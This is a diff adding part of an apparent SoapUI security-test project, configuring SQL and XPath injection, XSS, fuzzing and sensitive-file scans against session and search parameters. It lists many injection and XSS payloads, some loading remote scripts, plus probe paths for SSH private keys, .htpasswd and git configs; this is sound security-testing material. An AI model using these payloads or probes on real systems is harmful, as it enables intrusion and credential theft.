+    <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="fb384a6d-16ca-4476-b0ca-ce3053ebbe5b" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="2647c021-b84a-4a7d-b135-2b6982fcaa30" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+        <con:parameters label="searchstring" parameterName="searchstring" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="aad3a940-5eed-4f93-bb31-68facf603bb5" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:xpathList>or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList>
+        <con:xpathList>' or '1'='1</con:xpathList>
+        <con:xpathList>1/0</con:xpathList>
+        <con:xpathList>'%20o/**/r%201/0%20--</con:xpathList>
+        <con:xpathList>' o/**/r 1/0 --</con:xpathList>
+        <con:xpathList>;</con:xpathList>
+        <con:xpathList>'%20and%201=2%20--</con:xpathList>
+        <con:xpathList>' and 1=2 --</con:xpathList>
+        <con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList>
+        <con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="55b22353-70dd-46d4-a500-8f15d904e877" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+        <con:parameters label="searchstring" parameterName="searchstring" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="7b576cff-5604-498e-90ca-e84628046695" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:deselectedMethods/>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="8f5c72ab-66f3-44d8-8ac0-469ed5d79f9d" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="Valid HTTP Status Codes" id="51386ffc-02c8-4542-a037-9c9aa0a63236" name="Valid HTTP Status Codes">
+        <con:settings>
+          <con:setting id="__LEVEL_">WARNING</con:setting>
+        </con:settings>
+        <con:configuration>
+          <codes>501,405,403</codes>
+        </con:configuration>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="d2259425-e0e0-4ed0-8d6b-451098943580" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:SensitiveFileSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/>
+      </con:config>
+      <con:assertion type="Sensitive Files Exposure Assertion" id="57e1cc21-e522-4d18-b7b7-d844e3db3433" name="Sensitive Files Exposure"/>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="41f6670e-1ef1-44df-ba06-bf131c6ec62c" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="WeakPassword" id="d772aadf-4d02-45f0-9fb4-8ae06954d904" name="Weak Password Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="BasicAuth" id="c65c2a81-4560-478e-94fc-cb26c9577607" name="Basic Authentication Detection"/>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+  </con:testStepSecurityTest>
+  <con:testStepSecurityTest>
+    <con:testStepId>7406a0eb-e0bd-43d6-b123-be75ffdc0869</con:testStepId>
+    <con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="9e88aef3-57b3-444c-9d92-df9c89893171" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="Sensitive Information Exposure" id="2019a009-4083-46a7-95b5-bba017544e4d" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="buystring" parameterName="buystring" xpath="" checked="true"/>
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="6bf5a995-92d9-4614-b31a-414dd1919868" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="f1208f1f-21f3-4863-9c3e-4c24250aab9d" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="CrosSiteScript" id="a0f24ecd-7f40-4278-b4af-afa82bbac880" name="Cross Site Scripting Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="buystring" parameterName="buystring" xpath="" checked="true"/>
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="414b42be-faa2-42cc-983d-adadc87fa004" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:minimal>5</con:minimal>
+        <con:maximal>15</con:maximal>
+        <con:numberOfRequest>100</con:numberOfRequest>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="5ca404b0-c8ca-4d1e-8980-7015f0d49b81" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="buystring" parameterName="buystring" xpath="" checked="true"/>
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
